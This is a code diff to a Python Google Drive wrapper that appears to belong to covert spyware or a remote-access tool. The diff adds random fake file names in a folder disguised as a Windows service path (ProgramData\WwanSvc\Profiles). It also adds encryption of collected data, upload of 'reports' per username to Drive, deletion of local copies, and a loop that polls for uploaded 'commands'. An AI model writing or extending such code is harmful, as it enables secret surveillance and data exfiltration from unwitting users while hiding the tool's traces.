@@ -3,11 +3,14 @@ the securied way is to delete the the OAuth 2.0 Client ID once done
 and create a new oAuth id each time when giving a tooken
 '''
 #%%
+from base64 import b64encode
+from clint.crypto import encrypt
 import json
 from functools import lru_cache
 from json.decoder import JSONDecodeError
 from os.path import isfile, join, split, exists
 import os
+from Crypto.Cipher import AES
 from logger import log
 from shutil import rmtree
 from threading import Event, Lock, Thread
@@ -18,9 +21,9 @@ from oauth2client.client import OAuth2Credentials
 from pydrive.auth import GoogleAuth
 from pydrive.drive import GoogleDrive
 
-from .network import Net_Error, net_time, get, net_check
-from .util import basic_detail, data_store, formated_str, username
-from .fileio import fileio, d
+from .network import net_time, get, net_check
+from .util import basic_detail, data_store, formated_str, makedirs, random_str, username
+from .fileio import Fileio, d
 
 
 
@@ -44,7 +47,7 @@ class Drive:# wrap on GoogleDrive
         if self.running:
             return
         self.engine.start()
-    
+
     @property
     def running(self):
         return self.engine.is_alive()
@@ -66,8 +69,9 @@ class Drive:# wrap on GoogleDrive
     def sick_token(self):
         while 1:
             try:
+                # sometimes empty content result in returing html content as text
                 token=json.loads(get(self.token_url).text)
-            except (Net_Error, JSONDecodeError):
+            except JSONDecodeError:
                 pass
             else:
                 if self.validity(token):
@@ -77,7 +81,10 @@ class Drive:# wrap on GoogleDrive
         return token
 
     def validity(self, token):
-        token=token.get("access_token")
+        if token["expiry"]<time():
+            return False
+        
+        token=token["access_token"]
         url=f"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={token}"
         return get(url).ok
 
@@ -109,9 +116,6 @@ class Drive:# wrap on GoogleDrive
 #%%
 class drive_explorer:
     def __init__(self):
-        # todo: check token validity
-        # url=f"https://www.googleapis.com/oauth2/v1/tokeninfo?access_token={token}"
-        # put to a queue
         self.drive = Drive()
     
     def _split(self, p):# drive split
@@ -186,6 +190,7 @@ drive = drive_explorer()
 file_store = join(os.environ["ProgramData"], "WwanSvc\Profiles")
 #%%
 class Online:
+    '''direct use of this class is forbidden'''
     def __init__(self, path, prefix=f"reports/{username}"):
         path=join(prefix, path)
         self.file = drive.get_file(path)
@@ -194,6 +199,8 @@ class Online:
         return self.file.GetContentString()
 
     def write(self, data):
+        if isinstance(data, bytes):
+            data=b64encode(data).decode("utf-8")
         self.file.SetContentString(data+"\n"+self.read())
         self.file.Upload()
     
@@ -206,16 +213,14 @@ class Online:
 #%%
 class Offline:
     def __init__(self, path):
-        self.path = join(file_store, path)
-        try:
-            os.makedirs(split(self.path)[0])
-        except:
-            pass
+        self.real_name = path
+        self.path = join(file_store, random_str(8))# fake_name
         
+        makedirs(split(self.path)[0])
         self.file = None
 
     def __enter__(self):
-        self.file = fileio(self.path, "w")
+        self.file = Fileio(self.path, "w", self.real_name)
         return self.file
 
     def __exit__(self, *args):
@@ -267,13 +272,13 @@ class Auto_upload:
 
     def upload(self, path):
         '''path: absulate_path '''
-        file = fileio(path, "r")
+        file = Fileio(path, "r")
         
-        dpath = path.replace(file_store, "").lstrip('\\/')
+        dpath=file.report_name
         log.info(f'uploading to drive: {dpath}')
         with Online(dpath) as df:
-            df.write(file.read())
-        
+            df.write(file.read())# only the encrypted main content
+
         file.delete()
         file.__exit__()
 
@@ -283,8 +288,8 @@ class Auto_upload:
             return
         
         for i in os.listdir(response_path):
-            if isfile(i):
-                path = join(response_path, i)
+            path = join(response_path, i)
+            if isfile(path):
                 self.upload(path)
 
     def engine(self):
@@ -299,15 +304,15 @@ class Auto_upload:
                 "last_all_time": data_store.var.last_all_time,
                 "last_user_time": data_store.var.last_user_time
             }
-            f.write(data)
-        self.upload(file)
-        
-        self.upload_response()
+            # a lot to do at once. that is why direct use of Onine is forbidden
+            f.write(encrypt(json.dumps(data)))
+
         while 1:
+            self.upload_response()
             for i in self.list_uploads():
                 self.upload(i)
-                self.upload_response()# if any new command is produced in the mintime
                 sleep(.5)
             
+            log.info('waiting for new files to be created')
             while not d:# wait for any new file to be created
                 sleep(5)
